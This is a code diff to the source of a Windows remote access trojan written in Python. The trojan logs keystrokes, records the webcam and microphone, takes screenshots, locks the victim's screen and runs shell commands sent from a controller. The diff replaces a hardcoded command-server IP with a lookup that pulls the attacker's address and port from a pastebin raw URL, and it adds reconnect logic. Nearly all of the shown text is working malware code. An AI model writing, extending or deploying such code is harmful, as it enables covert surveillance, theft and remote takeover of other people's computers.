@@ -1,15 +1,15 @@
 from __future__ import print_function
+from bs4 import BeautifulSoup
 from shutil import copyfile
 from PIL import ImageGrab
-from os import getenv  
+from os import getenv
 import sqlite3, win32crypt, socket, subprocess, os, tempfile, pyaudio 
 import shutil, threading, win32api, pythoncom, random, wave        
-import numpy, sys, pyHook, shutil, cv2, time, ctypes
+import numpy, sys, pyHook, shutil, cv2, time, ctypes, urllib2
 
 micPath = tempfile.mkdtemp()
 keyLog = tempfile.mkdtemp()
 f_name = keyLog+"\log.txt"
-ip_address = '192.168.10.11'
 
 def activateMic(s, time):
     FORMAT = pyaudio.paInt16
@@ -110,7 +110,7 @@ def openCdDrive():
     subprocess.call(openDrive, shell=True)
     shutil.rmtree(cdDrive)
     
-def recWebCam():
+def recWebCam(ip_address):
     try:
         cap = cv2.VideoCapture(1) #Capture from webcam       
         while True:
@@ -212,9 +212,17 @@ def transfer(s,path,command):
 def getKeyLogFile(s, path):
     transfer(s,path)
 
-def connect():
+def getIpAddress():
+    # Create a pastebin post and paste the raw url here
+    response = urllib2.urlopen("""https://pastebin.com/raw/xtMtpGD8""")
+    data = response.read()
+    response.close()
+    info = data.split(':')
+    return info[0], info[1]
+
+def connect(ip_address, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip_address, 8080))
+    s.connect((ip_address, int(port)))
  
     while True: 
         command =  s.recv(1024*1024)
@@ -246,7 +254,7 @@ def connect():
             logging.start()
             s.send('[+] Keylogger started')
         elif 'activateWebcam' in command:
-            webcam = threading.Thread(target=recWebCam)
+            webcam = threading.Thread(target=recWebCam, args=(ip_address,))
             webcam.start()
         elif 'stopLogger' in command:
             stopLogger()
@@ -273,10 +281,8 @@ def connect():
             lockScreen()
             s.send( "[+] Victim Screen Lock")
         elif 'activateMic' in command:
-            print '[+] Recording....'
             call, time = command.split(' ')
             threading.Thread(target=activateMic, args=[s, time]).start()
-            #mic.start()
         elif 'getRecording' in command:
             transfer(s, micPath+"\\file.wav", command)
             shutil.rmtree(micPath)
@@ -297,13 +303,14 @@ def connect():
             s.send( CMD.stderr.read()  ) 
 
 def main ():
+    ip_address, port = getIpAddress()
     while True:
         try:
-            if connect() == 1:
+            if connect(ip_address, port) == 1:
                 break
         except:
             sleep_for = random.randrange(1, 10)
-            time.sleep(sleep_for)   
+            time.sleep(sleep_for)
             pass
 
 if __name__ == "__main__":
